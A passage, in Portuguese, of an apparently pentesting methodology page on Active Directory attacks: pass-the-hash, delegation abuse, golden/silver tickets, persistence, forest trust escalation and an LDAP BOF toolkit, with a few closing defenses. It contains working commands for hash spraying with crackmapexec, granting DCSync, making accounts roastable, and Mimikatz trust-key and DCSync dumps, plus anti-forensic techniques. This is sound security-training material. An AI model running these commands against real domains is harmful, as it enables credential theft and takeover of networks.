[**Acesse este link para conhecer as ferramentas que você pode usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Roubar Credenciais NTLM

Se você consegue **acessar outros PCs ou compartilhamentos**, pode **colocar arquivos** (como um arquivo SCF) que, se forem acessados de alguma forma, **acionarão uma autenticação NTLM contra você**, permitindo **roubar** o **desafio NTLM** para quebrá-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidade permitia que qualquer usuário autenticado **comprometesse o controlador de domínio**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalonamento de privilégios no Active Directory COM credenciais/sessão privilegiadas

**Para as técnicas a seguir, um usuário de domínio comum não é suficiente; você precisa de privilégios/credenciais especiais para realizar esses ataques.**

### Extração de hashes

Esperamos que você tenha conseguido **comprometer alguma conta de administrador local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), inclusive com relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalonamento local de privilégios](../windows-local-privilege-escalation/index.html).\
Então, é hora de despejar todos os hashes da memória e localmente.\
[**Leia esta página sobre diferentes maneiras de obter os hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Depois de obter o hash de um usuário**, você pode usá-lo para **se passar por ele**.\
Você precisa usar alguma **ferramenta** que **realize** a **autenticação NTLM usando** esse **hash**; **ou** pode criar um novo **sessionlogon** e **injetar** esse **hash** no **LSASS**, para que ele seja usado quando qualquer **autenticação NTLM for realizada**. Essa última opção é o que o mimikatz faz.\
[**Leia esta página para obter mais informações.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque tem como objetivo **usar o hash NTLM do usuário para solicitar tickets Kerberos**, como alternativa ao método comum Pass The Hash pelo protocolo NTLM. Portanto, pode ser especialmente **útil em redes onde o protocolo NTLM está desativado** e apenas **Kerberos é permitido** como protocolo de autenticação.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

No método de ataque **Pass The Ticket (PTT)**, os atacantes **roubam o ticket de autenticação de um usuário**, em vez da senha ou dos valores de hash. Esse ticket roubado é então usado para **se passar pelo usuário**, obtendo acesso não autorizado a recursos e serviços da rede.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Reutilização de credenciais

Se você tiver o **hash** ou a **senha** de um **administrador local**, deve tentar **fazer login localmente** em outros **PCs** com ele.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Observe que isso é bastante **ruidoso** e o **LAPS** poderia **mitigá-lo**.

### Abuso de MSSQL e links confiáveis

Se um usuário tiver privilégios para **acessar instâncias MSSQL**, poderá conseguir **executar comandos** no host MSSQL (se estiver sendo executado como SA), **roubar** o **hash** NetNTLM ou até realizar um **ataque** de **relay**.\
Se uma instância MSSQL for confiável por meio de um link de banco de dados com outra instância, um usuário com privilégios sobre o banco de dados vinculado poderá **usar a relação de confiança para executar consultas na outra instância**. Essas relações de confiança podem ser encadeadas e eventualmente levar a um banco de dados mal configurado no qual o usuário pode executar comandos.\
**Os links entre bancos de dados também funcionam entre trusts de floresta.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso de plataformas de inventário e implantação de TI

Suites de terceiros para inventário e implantação frequentemente expõem caminhos poderosos para obter credenciais e executar código. Consulte:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se encontrar qualquer objeto Computer com o atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e tiver privilégios de domínio no computador, você poderá extrair da memória os TGTs de todos os usuários que fizerem login nele.\
Assim, se um **Domain Admin fizer login no computador**, você poderá extrair o TGT dele e se passar por ele usando [Pass the Ticket](pass-the-ticket.md).\
Graças à constrained delegation, você poderia até **comprometer automaticamente um Print Server** (esperamos que seja um DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se um usuário ou computador estiver habilitado para "Constrained Delegation", poderá **se passar por qualquer usuário para acessar alguns serviços em um computador**.\
Então, se você **comprometer o hash** desse usuário/computador, poderá **se passar por qualquer usuário** (inclusive Domain Admins) para acessar alguns serviços.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resource-based Constrained Delegation

Ter privilégios de **WRITE** sobre um objeto do Active Directory de um computador remoto permite obter execução de código com **privilégios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuso de permissões/ACLs

O usuário comprometido pode ter alguns **privilégios interessantes sobre objetos do domínio** que podem permitir que você faça **movimento lateral**/**eleve** privilégios.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuso do serviço Printer Spooler

Descobrir um **serviço Spool em escuta** no domínio pode ser **explorado** para **obter novas credenciais** e **elevar privilégios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuso de sessões de terceiros

Se **outros usuários** **acessarem** a máquina **comprometida**, é possível **obter credenciais da memória** e até **injetar beacons nos processos deles** para se passar por eles.\
Normalmente, os usuários acessam o sistema via RDP; veja aqui como realizar alguns ataques contra sessões RDP de terceiros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

O **LAPS** fornece um sistema para gerenciar a **senha do Administrator local** em computadores ingressados no domínio, garantindo que ela seja **aleatória**, exclusiva e **alterada** com frequência. Essas senhas são armazenadas no Active Directory, e o acesso é controlado por ACLs, sendo permitido apenas a usuários autorizados. Com permissões suficientes para acessar essas senhas, é possível pivotar para outros computadores.


{{#ref}}
laps.md
{{#endref}}

### Roubo de certificados

**Coletar certificados** da máquina comprometida pode ser uma forma de elevar privilégios no ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuso de modelos de certificados

Se houver **modelos vulneráveis** configurados, é possível explorá-los para elevar privilégios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Pós-exploração com uma conta de alto privilégio

### Extração de credenciais do domínio

Depois de obter privilégios de **Domain Admin** ou, melhor ainda, de **Enterprise Admin**, você pode **extrair** o **banco de dados do domínio**: _ntds.dit_.

[**Mais informações sobre o ataque DCSync podem ser encontradas aqui**](dcsync.md).

[**Mais informações sobre como roubar o NTDS.dit podem ser encontradas aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Um arquivo de backup legível que contenha `ntds.dit` junto com o hive `SYSTEM` deve ser tratado como material do diretório exposto, mesmo antes da extração. Um hash de senha antigo não torna seguros os outros atributos do objeto: campos como `description` podem conter credenciais ou notas operacionais. Primeiro, inspecione os nomes dos membros do arquivo e evite incluir o conteúdo extraído do banco de dados na saída de enumeração de rotina.

### Privesc como persistência

Algumas das técnicas discutidas anteriormente podem ser usadas para persistência.\
Por exemplo, você poderia:

- Tornar usuários vulneráveis a [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Tornar os usuários vulneráveis a [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Conceder privilégios de [**DCSync**](#dcsync) a um usuário

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

O **ataque Silver Ticket** cria um **ticket Ticket Granting Service (TGS) legítimo** para um serviço específico usando o **hash NTLM** (por exemplo, o **hash da conta do PC**). Esse método é usado para **acessar os privilégios do serviço**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Um **ataque Golden Ticket** envolve um invasor obtendo acesso ao **hash NTLM da conta krbtgt** em um ambiente do Active Directory (AD). Essa conta é especial porque é usada para assinar todos os **Ticket Granting Tickets (TGTs)**, essenciais para autenticação na rede do AD.

Depois de obter esse hash, o invasor pode criar **TGTs** para qualquer conta que escolher (ataque Silver Ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

São como golden tickets, forjados de uma forma que **contorna os mecanismos comuns de detecção de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistência com certificados de conta**

**Ter certificados de uma conta ou poder solicitá-los** é uma ótima maneira de manter a persistência na conta de um usuário (mesmo que ele altere a senha):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistência com certificados no domínio**

**Também é possível usar certificados para manter a persistência com privilégios elevados no domínio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupo AdminSDHolder

O objeto **AdminSDHolder** no Active Directory protege **grupos privilegiados** (como Domain Admins e Enterprise Admins) aplicando uma **Access Control List (ACL)** padrão a esses grupos para impedir alterações não autorizadas. No entanto, esse recurso pode ser explorado: se um invasor modificar a ACL do AdminSDHolder para conceder acesso total a um usuário comum, esse usuário ganha amplo controle sobre todos os grupos privilegiados. Assim, essa medida de segurança pode ter o efeito contrário ao pretendido, permitindo acesso indevido se não for monitorada de perto.

[**Mais informações sobre o grupo AdminDSHolder aqui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Credenciais DSRM

Em todo **Domain Controller (DC)** existe uma conta de **administrador local**. Ao obter direitos de administrador em uma máquina desse tipo, é possível extrair o hash do Administrator local usando **mimikatz**. Depois disso, é necessário modificar o registro para **habilitar o uso dessa senha**, permitindo o acesso remoto à conta do Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistência com ACL

Você pode **conceder** **permissões especiais** a um **usuário** sobre objetos específicos do domínio, permitindo que ele **eleve privilégios no futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Descritores de segurança

Os **descritores de segurança** são usados para **armazenar** as **permissões** que um **objeto** tem **sobre** outro **objeto**. Se você puder fazer uma **pequena alteração** no **descritor de segurança** de um objeto, poderá obter privilégios muito interessantes sobre ele sem precisar ser membro de um grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Objetos dinâmicos: anti-forensics/evasão

Abuse a classe auxiliar `dynamicObject` para criar principals/GPOs/registros DNS de curta duração com `entryTTL`/`msDS-Entry-Time-To-Die`; eles se excluem automaticamente sem tombstones, apagando evidências do LDAP e deixando SIDs órfãos, referências `gPLink` quebradas ou respostas DNS em cache (por exemplo, poluição de ACE do AdminSDHolder ou redirecionamentos maliciosos de `gPCFileSysPath`/DNS integrado ao AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Altere o **LSASS** na memória para estabelecer uma **senha universal**, concedendo acesso a todas as contas do domínio.


{{#ref}}
skeleton-key.md
{{#endref}}

### SSP personalizado

[Saiba aqui o que é um SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Você pode criar seu **próprio SSP** para **capturar** em **texto simples** as **credenciais** usadas para acessar a máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Ele registra um **novo Domain Controller** no AD e o usa para **enviar atributos** (SIDHistory, SPNs...) a objetos especificados, **sem** deixar **logs** das **modificações**. Você **precisa de privilégios DA** e deve estar dentro do **domínio raiz**.\
Observe que, se você usar dados incorretos, serão gerados logs bem desagradáveis.


{{#ref}}
dcshadow.md
{{#endref}}

### Persistência com LAPS

Anteriormente, discutimos como elevar privilégios se você tiver **permissões suficientes para ler as senhas do LAPS**. No entanto, essas senhas também podem ser usadas para **manter a persistência**.\
Confira:


{{#ref}}
laps.md
{{#endref}}

## Elevação de privilégios na floresta - relações de confiança entre domínios

A Microsoft considera a **Floresta** o limite de segurança. Isso significa que **comprometer um único domínio pode potencialmente levar ao comprometimento de toda a Floresta**.<sup>[[1]](#references)</sup>

### Informações básicas

Uma [**relação de confiança entre domínios**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) é um mecanismo de segurança que permite a um usuário de um **domínio** acessar recursos em outro **domínio**. Basicamente, ela cria uma ligação entre os sistemas de autenticação dos dois domínios, permitindo que as verificações de autenticação ocorram sem interrupções. Quando os domínios configuram uma relação de confiança, eles trocam e armazenam **chaves** específicas nos respectivos **Domain Controllers (DCs)**, essenciais para a integridade dessa relação.

Em uma situação típica, se um usuário quiser acessar um serviço em um **domínio confiável**, primeiro precisará solicitar um ticket especial, conhecido como **TGT entre domínios**, ao DC do próprio domínio. Esse TGT é criptografado com uma **chave** compartilhada, acordada entre os dois domínios. Em seguida, o usuário apresenta esse TGT ao **DC do domínio confiável** para obter um ticket de serviço (**TGS**). Quando o DC do domínio confiável valida o TGT entre domínios, ele emite um TGS, concedendo ao usuário acesso ao serviço.

**Etapas**:

1. Um **computador cliente** no **Domínio 1** inicia o processo usando seu **hash NTLM** para solicitar um **Ticket Granting Ticket (TGT)** ao seu **Domain Controller (DC1)**.
2. Se a autenticação do cliente for bem-sucedida, o DC1 emite um novo TGT.
3. Em seguida, o cliente solicita ao DC1 um **TGT entre domínios**, necessário para acessar recursos no **Domínio 2**.
4. O TGT entre domínios é criptografado com uma **chave de confiança** compartilhada entre o DC1 e o DC2 como parte da relação de confiança bidirecional entre os domínios.
5. O cliente leva o TGT entre domínios ao **Domain Controller do Domínio 2 (DC2)**.
6. O DC2 verifica o TGT entre domínios usando a chave de confiança compartilhada e, se for válido, emite um **Ticket Granting Service (TGS)** para o servidor no Domínio 2 que o cliente quer acessar.
7. Por fim, o cliente apresenta esse TGS ao servidor. Ele é criptografado com o hash da conta do servidor e permite acessar o serviço no Domínio 2.

### Diferentes relações de confiança

É importante observar que **uma relação de confiança pode ser unidirecional ou bidirecional**. Em uma relação bidirecional, os dois domínios confiam um no outro; em uma relação **unidirecional**, um dos domínios será o **domínio confiável** e o outro, o **domínio que confia**. Nesse último caso, **só será possível acessar recursos do domínio que confia a partir do domínio confiável**.

Se o Domínio A confia no Domínio B, A é o domínio que confia e B é o domínio confiável. Além disso, no **Domínio A**, essa será uma relação de confiança **de saída**; no **Domínio B**, será uma relação de confiança **de entrada**.

**Diferentes relações de confiança**

- **Relações de confiança pai-filho**: Esta é uma configuração comum dentro da mesma floresta, na qual um domínio filho tem automaticamente uma relação de confiança transitiva e bidirecional com seu domínio pai. Isso significa que as solicitações de autenticação podem fluir sem interrupções entre o pai e o filho.
- **Relações de confiança de atalho**: Também chamadas de "relações de confiança shortcut", são estabelecidas entre domínios filhos para agilizar os processos de encaminhamento. Em florestas complexas, os encaminhamentos de autenticação normalmente precisam subir até a raiz da floresta e depois descer até o domínio de destino. A criação de relações de confiança de atalho encurta esse percurso, o que é especialmente útil em ambientes geograficamente dispersos.
- **Relações de confiança externas**: São configuradas entre domínios diferentes e não relacionados, e não são transitivas por natureza. De acordo com a [documentação da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), relações de confiança externas são úteis para acessar recursos em um domínio fora da floresta atual que não esteja conectado por uma relação de confiança entre florestas. A filtragem de SID reforça a segurança das relações de confiança externas.
- **Relações de confiança de raiz de árvore**: São estabelecidas automaticamente entre o domínio raiz da floresta e uma nova raiz de árvore adicionada. Embora não sejam encontradas com frequência, são importantes para adicionar novas árvores de domínio a uma floresta, permitindo que mantenham um nome de domínio exclusivo e garantindo a transitividade bidirecional. Mais informações estão disponíveis no [guia da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Relações de confiança entre florestas**: Esse tipo de relação de confiança é bidirecional e transitivo entre duas raízes de floresta, e também aplica a filtragem de SID para reforçar as medidas de segurança.
- **Relações de confiança MIT**: São estabelecidas com domínios Kerberos não Windows [compatíveis com RFC4120](https://tools.ietf.org/html/rfc4120). As relações de confiança MIT são mais especializadas e atendem a ambientes que exigem integração com sistemas baseados em Kerberos fora do ecossistema Windows.

#### Outras diferenças nas **relações de confiança**

- Uma relação de confiança também pode ser **transitiva** (A confia em B, B confia em C, então A confia em C) ou **não transitiva**.
- Uma relação de confiança pode ser configurada como **bidirecional** (ambos confiam um no outro) ou **unidirecional** (apenas um deles confia no outro).

### Caminho de ataque

1. **Enumere** as relações de confiança
2. Verifique se algum **principal de segurança** (usuário/grupo/computador) tem **acesso** a recursos do **outro domínio**, talvez por entradas ACE ou por pertencer a grupos do outro domínio. Procure **relações entre domínios** (provavelmente foi por isso que a relação de confiança foi criada).
   1. Fazer kerberoast também pode ser uma opção nesse caso.
3. **Comprometa** as **contas** que podem **pivotar** entre domínios.

Invasores que têm acesso a recursos em outro domínio podem obtê-lo por meio de três mecanismos principais:

- **Associação a grupo local**: Principals podem ser adicionados a grupos locais em máquinas, como o grupo “Administrators” em um servidor, concedendo a eles controle significativo sobre essa máquina.
- **Associação a grupo de domínio externo**: Principals também podem ser membros de grupos no domínio externo. No entanto, a eficácia desse método depende da natureza da relação de confiança e do escopo do grupo.
- **Access Control Lists (ACLs)**: Principals podem ser especificados em uma **ACL**, especialmente como entidades em **ACEs** dentro de uma **DACL**, o que lhes dá acesso a recursos específicos. Para quem quiser se aprofundar no funcionamento de ACLs, DACLs e ACEs, o whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” é um recurso inestimável.<sup>[[17]](#references)</sup>

### Encontrar usuários/grupos externos com permissões

Você pode verificar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar principals de segurança externos no domínio. Eles serão usuários/grupos de **um domínio/floresta externo**.

Você pode verificar isso no **Bloodhound** ou usando o powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Escalonamento de privilégios de uma floresta filha para a floresta pai

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Outras maneiras de enumerar trusts de domínio:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Existem **2 chaves confiáveis**, uma para _Child --> Parent_ e outra para _Parent_ --> _Child_.\
> Você pode obter a chave usada pelo domínio atual com:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escale para Enterprise admin no domínio filho/pai abusando da relação de confiança com SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Explore a Configuration NC gravável

É crucial entender como a Configuration Naming Context (NC) pode ser explorada. A Configuration NC funciona como um repositório central de dados de configuração em florestas de ambientes Active Directory (AD). Esses dados são replicados para cada Domain Controller (DC) da floresta, e os DCs graváveis mantêm uma cópia gravável da Configuration NC. Para explorar isso, é necessário ter **privilégios SYSTEM em um DC**, de preferência em um DC filho.

**Vincule uma GPO ao site do DC raiz**

O contêiner Sites da Configuration NC inclui informações sobre os sites de todos os computadores associados ao domínio na floresta do AD. Com privilégios SYSTEM em qualquer DC, os atacantes podem vincular GPOs aos sites do DC raiz. Essa ação pode comprometer o domínio raiz ao manipular as políticas aplicadas a esses sites.

Para informações detalhadas, consulte pesquisas sobre [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Comprometa qualquer gMSA da floresta**

Um vetor de ataque envolve o direcionamento a gMSAs privilegiadas no domínio. A KDS Root key, essencial para calcular as senhas das gMSAs, é armazenada na Configuration NC. Com privilégios SYSTEM em qualquer DC, é possível acessar a KDS Root key e calcular as senhas de qualquer gMSA da floresta.

Uma análise detalhada e instruções passo a passo estão disponíveis em:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementar a MSA delegada (BadSuccessor – abuso de atributos de migração):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Pesquisa externa adicional: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Ataque de alteração do Schema**

Este método exige paciência: é preciso aguardar a criação de novos objetos AD privilegiados. Com privilégios SYSTEM, um atacante pode modificar o AD Schema para conceder a qualquer usuário controle total sobre todas as classes. Isso pode levar ao acesso não autorizado e ao controle de objetos AD recém-criados.

Para saber mais, consulte [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**De DA para EA com ADCS ESC5**

A vulnerabilidade ADCS ESC5 explora o controle sobre objetos de Public Key Infrastructure (PKI) para criar um template de certificado que permite autenticar-se como qualquer usuário da floresta. Como os objetos PKI ficam na Configuration NC, comprometer um DC filho gravável possibilita a execução de ataques ESC5.

Mais detalhes estão disponíveis em [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Em cenários sem ADCS, o atacante pode configurar os componentes necessários, conforme descrito em [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Domínio de floresta externa - unidirecional (de entrada) ou bidirecional

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Neste cenário, **seu domínio é confiável** para um domínio externo, que lhe concede **permissões indeterminadas** sobre ele. Você precisará descobrir **quais principais do seu domínio têm acesso ao domínio externo e qual acesso cada um tem** e, em seguida, tentar explorá-lo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domínio de floresta externa - unidirecional (de saída)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Neste cenário, **seu domínio** está **confiando** alguns **privilégios** a um principal de **outro domínio**.

No entanto, quando um **domínio é confiado** pelo domínio que confia, o domínio confiado **cria um usuário** com um **nome previsível** que usa como **senha a senha de confiança**. Isso significa que é possível **acessar um usuário do domínio que confia para entrar no domínio confiado**, enumerá-lo e tentar escalar ainda mais privilégios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Outra forma de comprometer o domínio confiado é encontrar um [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) criado na **direção oposta** à confiança entre os domínios (o que não é muito comum).

Outra forma de comprometer o domínio confiado é aguardar em uma máquina à qual um **usuário do domínio confiado pode acessar** para fazer login via **RDP**. Então, o atacante poderia injetar código no processo da sessão RDP e **acessar o domínio de origem da vítima** a partir dali.\
Além disso, se a **vítima tiver montado o disco rígido**, o atacante poderia armazenar **backdoors** na **pasta de inicialização do disco rígido** a partir do processo da **sessão RDP**. Essa técnica é chamada **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigação contra abuso de confiança entre domínios

### **Filtragem de SID:**

- O risco de ataques que exploram o atributo SID history entre trusts de floresta é mitigado pela filtragem de SID, ativada por padrão em todos os trusts entre florestas. Isso se baseia na suposição de que os trusts dentro de uma floresta são seguros, considerando a floresta, e não o domínio, como limite de segurança, conforme a posição da Microsoft.
- No entanto, há um porém: a filtragem de SID pode interromper aplicações e o acesso de usuários, levando à sua desativação ocasional.

### **Autenticação seletiva:**

- Para trusts entre florestas, o uso da autenticação seletiva garante que usuários das duas florestas não sejam autenticados automaticamente. Em vez disso, são necessárias permissões explícitas para que os usuários acessem domínios e servidores dentro do domínio ou floresta que confia.
- É importante observar que essas medidas não protegem contra a exploração do writable Configuration Naming Context (NC) nem contra ataques à conta de confiança.

[**Mais informações sobre trusts de domínio em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abuso de AD baseado em LDAP a partir de implantes no host

A [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) reimplementa primitivas LDAP no estilo bloodyAD como Beacon Object Files x64, que são executados inteiramente dentro de um implante no host (por exemplo, Adaptix C2). Os operadores compilam o pacote com `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, carregam `ldap.axs` e chamam `ldap <subcommand>` a partir do beacon. Todo o tráfego usa o contexto de segurança do logon atual via LDAP (389) com assinatura/selagem ou LDAPS (636) com confiança automática no certificado, sem necessidade de proxies socks ou artefatos em disco.<sup>[[4]](#references)</sup>

### Enumeração LDAP no implante

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` e `get-groupmembers` resolvem nomes curtos/caminhos de OU em DNs completos e extraem os objetos correspondentes.
- `get-object`, `get-attribute` e `get-domaininfo` obtêm atributos arbitrários (incluindo descritores de segurança), além dos metadados da floresta/domínio de `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` e `get-rbcd` expõem candidatos a roasting, configurações de delegação e descritores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) diretamente do LDAP.
- `get-acl` e `get-writable --detailed` analisam a DACL para listar trustees, direitos (GenericAll/WriteDACL/WriteOwner/gravações de atributos) e herança, indicando alvos imediatos para escalação de privilégios por ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Primitivas de escrita LDAP para escalada e persistência

- BOFs de criação de objetos (`add-user`, `add-computer`, `add-group`, `add-ou`) permitem que o operador prepare novos principais ou contas de máquina em qualquer lugar onde existam permissões de OU. `add-groupmember`, `set-password`, `add-attribute` e `set-attribute` permitem sequestrar diretamente os alvos assim que forem encontrados direitos de write-property.
- Comandos focados em ACL, como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` e `add-dcsync`, convertem WriteDACL/WriteOwner em qualquer objeto do AD em redefinições de senha, controle de associação a grupos ou privilégios de replicação DCSync, sem deixar rastros de PowerShell/ADSI. Os comandos correspondentes `remove-*` limpam ACEs injetadas.

### Delegação, roasting e abuso do Kerberos

- `add-spn`/`set-spn` tornam instantaneamente um usuário comprometido vulnerável a Kerberoast; `add-asreproastable` (alternância de UAC) marca a conta para AS-REP roasting sem tocar na senha.
- Macros de delegação (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescrevem `msDS-AllowedToDelegateTo`, flags de UAC ou `msDS-AllowedToActOnBehalfOfOtherIdentity` diretamente do beacon, habilitando caminhos de ataque com delegação restrita/irrestrita/RBCD e eliminando a necessidade de PowerShell remoto ou RSAT.

### Injeção de sidHistory, realocação de OU e configuração da superfície de ataque

- `add-sidhistory` injeta SIDs privilegiados no histórico de SID de um principal controlado (consulte [Injeção de SID-History](sid-history-injection.md)), proporcionando herança de acesso furtiva totalmente por LDAP/LDAPS.
- `move-object` altera o DN/OU de computadores ou usuários, permitindo que um invasor coloque ativos sob direitos delegados antes de usar `set-password`, `add-groupmember` ou `add-spn`. Consulte [Realocação de OU e direitos herdados](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) para ver as permissões de movimentação e as verificações de herança.
- Comandos de remoção com escopo bem definido (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` etc.) permitem uma reversão rápida depois que o operador coleta credenciais ou estabelece persistência, minimizando a telemetria.

## AD -> Azure e Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algumas defesas gerais

[**Saiba mais sobre como proteger credenciais aqui.**](../stealing-credentials/credentials-protections.md)

### **Medidas defensivas para proteção de credenciais**

- **Restrições para Domain Admins**: recomenda-se que Domain Admins só possam fazer login em Domain Controllers, evitando seu uso em outros hosts.
- **Privilégios de contas de serviço**: os serviços não devem ser executados com privilégios de Domain Admin (DA), para manter a segurança.
- **Limitação temporal de privilégios**: a duração das tarefas que exigem privilégios de DA deve ser limitada. Isso pode ser feito com: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigação de relay LDAP**: audite os Event IDs 2889/3074/3075 e, em seguida, aplique a assinatura LDAP e o channel binding LDAPS em DCs/clientes para bloquear tentativas de MITM/relay LDAP.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

